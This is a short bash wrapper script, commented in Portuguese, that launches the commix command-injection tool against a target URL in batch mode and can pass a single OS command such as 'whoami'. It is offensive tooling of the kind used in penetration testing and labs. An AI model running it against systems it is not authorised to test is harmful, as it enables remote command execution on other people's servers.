#!/usr/bin/env bash
# commix_run.sh
# Uso: ./commix_run.sh "http://target/vuln.php?cmd=INJECT_HERE" [--os-cmd="whoami"]
# Requisitos: commix instalado (ou usar container Kali)

set -euo pipefail

if [ $# -lt 1 ]; then
  echo "Uso: $0 <URL_WITH_INJECT_HERE> [--os-cmd='command']"
  exit 1
fi

URL="$1"
OS_CMD="${2:-}"

echo "[*] Executando commix contra: $URL"
if [ -n "$OS_CMD" ]; then
  echo "[*] Executando comando único: $OS_CMD"
  commix --url="$URL" --os-cmd="$OS_CMD" --batch
else
  commix --url="$URL" --batch
fi

echo "[*] Finalizado."
